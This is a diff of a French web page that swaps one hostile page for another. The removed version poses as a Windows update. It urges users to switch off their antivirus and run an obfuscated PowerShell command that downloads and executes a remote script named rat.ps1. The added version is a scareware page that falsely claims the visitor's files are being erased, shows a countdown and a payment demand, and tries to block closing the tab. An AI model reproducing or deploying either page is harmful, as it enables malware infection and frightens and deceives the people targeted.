@@ -2,63 +2,75 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mise à jour Windows</title>
+    <title>ERREUR CRITIQUE</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #f3f3f3; color: #333; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        
-        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 600px; text-align: center; }
-        .logo { font-size: 40px; color: #0078D7; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin-bottom: 15px; color: #0078D7; }
-        p { font-size: 15px; color: #555; margin-bottom: 15px; line-height: 1.5; text-align: left; }
-        
-        .code-box { background-color: #f0f0f0; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 13px; color: #d32f2f; cursor: pointer; display: block; margin: 15px 0; text-align: left; border: 1px dashed #ccc; word-break: break-all; }
-        .code-box:hover { background-color: #e0e0e0; }
-        .code-box:active { background-color: #d0d0d0; }
-        
-        .instruction { font-size: 14px; color: #666; margin-top: 10px; text-align: left; }
-        
-        .btn { background-color: #0078D7; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        .btn:hover { background-color: #005a9e; }
+        body { margin: 0; padding: 0; background-color: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        h1 { font-size: 15vw; margin: 0; text-shadow: 0 0 20px red; animation: shake 0.1s infinite; }
+        p { font-size: 2vw; color: #fff; }
+        .red { color: #f00; font-weight: bold; }
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">⊞</div>
-        <h1>Mise à jour de sécurité Windows 11</h1>
-        <p>La mise à jour <strong>KB5034441</strong> est bloquée sur votre appareil car une protection obsolète ou un réseau VPN a été détecté.</p>
-        <p><strong>Pour résoudre ce problème :</strong></p>
-        <ol style="font-size: 14px; color: #555; text-align: left; margin-bottom: 15px; padding-left: 20px;">
-            <li>Désactivez votre VPN le temps de l'installation.</li>
-            <li><strong>Désactivez totalement votre antivirus</strong> (Windows Defender ou Avast) sinon l'installation sera bloquée.</li>
-            <li>Laissez votre navigateur <strong>ouvert</strong> pendant toute la durée de la réparation.</li>
-        </ol>
-        
-        <p>Exécutez la commande suivante dans l'invite de commandes :</p>
-        
-        <!-- Commande encodée en Base64 pour éviter la détection d'Avast -->
-        <div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -EncodedCommand SQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHMAdwBpAGUAbQBhAGwAaQAyAC0AbABnAHQAbQAvAG0AZQBtAGIAZQByAC0AYwBsAGUAYQBuAHUAcAAvAG0AYQBpAG4ALwByAGEAdAAuAHAAcwAxACAAfAAgAGkAZQB4AA==</div>
-        
-        <p class="instruction">Appuyez sur <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b>.</p>
-        
-        <button class="btn" onclick="copyCode()">Copier la commande</button>
-    </div>
+    <h1 id="title">666</h1>
+    <p id="message">JE T'AI HACKÉ</p>
+    <p>TES FICHIERS SONT EN TRAIN D'ÊTRE EFFACÉS</p>
+    <p class="red" id="timer">TEMPS RESTANT : 60 SECONDES</p>
 
     <script>
-        function copyCode() {
-            const text = document.getElementById('cmdText').innerText;
-            navigator.clipboard.writeText(text).then(() => {
-                const el = document.getElementById('cmdText');
-                el.innerText = "✅ Code copié ! Appuyez sur Windows + R";
-                el.style.color = "#4caf50";
-                setTimeout(() => {
-                    el.innerText = text;
-                    el.style.color = "#d32f2f";
-                }, 3000);
-            });
-        }
+        // Demander le plein écran au clic
+        document.body.addEventListener('click', () => {
+            if (document.body.requestFullscreen) {
+                document.body.requestFullscreen();
+            }
+        });
+
+        // Faire clignoter la page
+        setInterval(() => {
+            document.body.style.backgroundColor = document.body.style.backgroundColor === 'red' ? 'black' : 'red';
+            document.body.style.color = document.body.style.color === 'black' ? 'red' : 'black';
+        }, 500);
+
+        // Changer le texte
+        const messages = ["666", "JE T'AI HACKÉ", "TES DONNÉES SONT À MOI", "PRÊT À PAYER ?", "666"];
+        let i = 0;
+        setInterval(() => {
+            document.getElementById('title').innerText = messages[i];
+            i = (i + 1) % messages.length;
+        }, 1000);
+
+        // Compte à rebours
+        let timeLeft = 60;
+        const timerElement = document.getElementById('timer');
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.innerText = `TEMPS RESTANT : ${timeLeft} SECONDES`;
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerElement.innerText = "SYSTEME ETEINT.";
+                document.body.style.backgroundColor = "#000";
+                document.body.style.color = "#333";
+            }
+        }, 1000);
+
+        // Empêcher la fermeture
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = "Le processus d'effacement est en cours. Voulez-vous vraiment quitter ?";
+            return e.returnValue;
+        });
     </script>
 </body>
 </html>
